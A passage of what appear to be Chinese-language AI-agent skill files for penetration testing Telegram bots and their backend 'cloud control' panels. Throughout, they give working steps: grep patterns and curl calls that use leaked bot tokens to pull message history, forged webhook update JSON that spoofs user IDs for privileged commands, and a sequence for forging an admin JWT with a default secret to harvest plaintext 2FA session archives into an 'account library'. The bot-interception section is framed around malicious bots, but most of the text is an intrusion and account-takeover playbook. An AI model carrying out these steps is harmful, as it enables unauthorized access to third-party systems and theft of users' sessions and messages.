+**恶意 C2 bot 专用拦截流程(ANY.RUN 方法,脚本见 anyrun/blog-scripts):**
+```
+① 抓样本拿 token + chat_id(可能在 URL query 或 POST body)
+② getWebhookInfo → 有 webhook 先保存配置再 deleteWebhook
+③ 建 TG 群、把自己设匿名、把 bot 拉进群
+④ getUpdates?offset=-1 重置 → 再 getUpdates?offset=<update_id+1> 清历史
+⑤ forwardMessage / forwardMessages 把运营者消息转到自己群
+⑥ 完事恢复原 webhook
+```
+
+## 第 3 步: Webhook/后端渗透(bot 服务端)
+
+**伪造 update(最典型):** bot 后端若不校验 `X-Telegram-Bot-Api-Secret-Token` header(secret_token),任何人都能 POST 伪造 update JSON → 伪 from.id 冒充白名单用户执行特权命令(CVE-2026-28454 OpenClaw,CVSS 9.1;zealynx F-2026-0005 用可控 update_id 绕过反重放)。
+
+```json
+{"update_id": 999999, "message": {"message_id": 1,
+  "from": {"id": 67890, "is_bot": false, "first_name": "Attacker"},
+  "chat": {"id": 67890, "type": "private"}, "date": 1700000000,
+  "text": "/start VALID_AUTH_CODE_HERE"}}
+```
+要点:先找到 webhook 端点(Swagger/路径惯例/反代配置);敏感命令只看 from.id 的 bot 必中招。
+
+**业务洞:** SQL 注入(私密消息泄露)、callback_data 篡改、/start payload 注入(64字符,当参数打后端)、payments/Stars 回调伪造白嫖、命令拼接注入。
+**管理后台** → 转 `tg-bot-backend-pentest`(测绘找面板+弱口令+路径穿越上传)。
+
+## 第 4 步: 客户端/恶意样本逆向
+
+| 产物类型 | 打法 |
+|---|---|
+| PyInstaller bot/RAT | pyinstxtractor 解包 → 反编译 .pyc → grep token/chat_id/命令处理(案例:NursultanClient) |
+| 前端 JS(drainer/stealer) | 先搜 api.telegram.org/token/chat_id 字符串锚点 → 沿调用回推;重度混淆用 de4js/AST 还原;注意假私钥诱饵 |
+| APK(混合 bot 客户端) | jadx 解包 → token/后端 URL;后端在服务端则转 web 渗透 |
+| 开源 bot 源码 | pip-audit / npm audit 审计依赖(aiogram<3.22 WebApp 签名 `==` 时序洞、pyTelegramBotAPI→aiohttp CVE-2024-23334 等) |
+
+## 第 5 步: 情报聚类与归属(恶意 bot)
+
+- 同 token / 同 webhook URL / 同描述文本 / 同 chat_id → 同一运营者
+- webhook 基础设施是 pivot:webhook.site / *.pipedream.net / *.trycloudflare.com / livegram.io = 一次性中继;自有域名 = 运营者基建
+- bot 自曝:`getMyDescription`、menu web-app URL(→ Mini App 攻击面)、pinned message 常带广告或误泄 token
+- 工具:matkap(0x6rss/matkap)——token 验证/Hunt 前转/IOC Discovery(ThreatFox/urlscan/ZoomEye)/统计面板
+
+## 关联
+- 完整资料汇编:`D:\渗透\TGbot渗透逆向资料\TGbot渗透逆向_资料汇编.md`(含 30+ 案例全文链接、writeups 过滤文件、防御速查)
+- 相关技能:tg-bot-backend-pentest(后台面板)、telegram-webapp-api-pentest(Mini App initData)、tg-bot-operations(自营 bot)、bot-panel-spacemapping(测绘)
+
+---
+
+<!-- 补充视角: tg-bot-token-webhook-fullchain (兄弟技能库 2026-09-12) -->
+
+---
+name: tg-bot-token-webhook-fullchain
+description: "TG bot token/webhook渗透时使用。触发: bot token接管, setWebhook, 云控面板。"
+version: 1.0.0
+license: MIT
+metadata:
+    related_skills: [tg-bot-pentest-reverse, tg-walletbot-pentest, tg-webapp-pentest, tg-bot-live-pentest, surveyengine-knowledge-pack]
+---
+
+# TG Bot Token/Webhook/云控面板 全链渗透
+
+## When to Use
+
+遇到正文顶部触发指纹/关键词时使用本技能(吸收自测绘引擎知识包)。完整卡全文: 镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\<原名>\SKILL.md`。
+
+
+来源: 测绘引擎知识包吸收。5 面攻击面(A token / B webhook / C 业务逻辑 / D 生态 / E 客户端源码)。完整卡: 镜像 `.cursor\skills\tg-bot-webhook-hijack\SKILL.md` + `tg-cloud-panel\SKILL.md`。
+
+## A 面: Token 泄露 → 全接管(最高频)
+```bash
+# Token 格式: <bot_id>:<35位secret>;grep 正则
+grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'
+# 验证 + 回放历史
+curl -s "https://api.telegram.org/bot${TOKEN}/getMe"
+curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1000"
+# 先 getWebhookInfo(有 webhook=bot 在跑,动静大)再决定截流或只 forwardMessage
+curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"
+```
+
+| 泄露途径 | 打法 |
+|---|---|
+| 前端 JS 硬编码 | `curl -s https://target/_nuxt/*.js \| grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'` |
+| GitHub/历史 | `gitleaks detect` / `trufflehog git`(规则 `[0-9]{10}:...35`) |
+| .env/docker-compose | `/.env`、`/docker-compose.yml` 目录爆破 `BOT_TOKEN=` |
+| 钓鱼 kit | open dir 挖 `sign/*.html` 每变体轮换自己的 token |
+| 日志 | laravel.log/app.log 搜 token 正则 |
+
+**拿到 token 别立刻 getUpdates 拉全量**(运营者可能监控);先 getWebhookInfo 评估。
+
+## B 面: Webhook 后端攻击
+- 签名缺失确认 → 伪造 update 执行命令;**伪造 admin from.id 提权**
+- secret_token 缺失 = L1;伪造 update 执行命令 = L2;伪造 admin 提权 = L3;Stars 支付伪造白嫖 = L3
+- 断原通知流操作(set-webhook 到自己 URL)**先问**或用测试 bot
+
+## C 面: 云控面板认族(四族,禁止混打)
+| 指纹 | 走 | 不要做 |
+|---|---|---|
+| `gAAAAA` / `:8000/:8020` / Fernet | Fernet session 解密(本族) | 当 JWT 弱钥结案 |
+| 「系统选择」`/tgcloud_pc` `/customer` / OSS STS | tg-cloud-control 扩展(双应用) | 打 Fernet/proxy |
+| JWT HS256 `your_secret_key` / `/proxy/list` / `/admin/users` / Session ZIP | **伪造 admin → GET /proxy/list /admin/users → Session ZIP 收明文 2FA** | 打 Fernet/OSS |
+| `/main.wasm` + `window.goEncrypt` + 掩码票 | 有头浏览器 oracle + jwt probe | 先逆向 WASM |
+
+- **JWT 第三族顺序**: 手工试 `your_secret_key` → 伪造 admin → `/proxy/list` `/admin/users` 未授权读 → Session ZIP 明文 2FA → 撤权后枚举 `ver/version/v/jti`(五次内复活才报)
+- **成功口径 = 可登录 session**,不是手机号/代理条数
+
+## 云控平台(系统选择双应用)
+- 架构: `/tgcloud_pc`(用户后台)+ `/customer`(客服系统);PHP 后端(index.php/.php 全 403);9000 端口 Swoole WS(HTTP 直连 400)
+- `/api/common/config_init` 未授权 200 → 泄露 platform_name/websocket_url/cdn_url/auths/价格
+- FOFA `domain="<目标>"` → 同平台多节点(不同 IP 同「系统选择」页同 OSS bucket)
+
+## 下游衔接
+- Fernet 族 → 解 session key;`:3000` Vite → vite-fs-read;明文 session 外连验活
+- Bot 管理面越权 → 本卡 A/B 面;FastAdmin Shop `/shop_hq` → fastadmin 专卡
+- 解出明文 session 入池 → tg-account-library
+
+## 完整情报
+镜像 `D:\博彩通杀\技能库\测绘引擎知识包\.cursor\skills\tg-bot-webhook-hijack\SKILL.md`(417行全链)
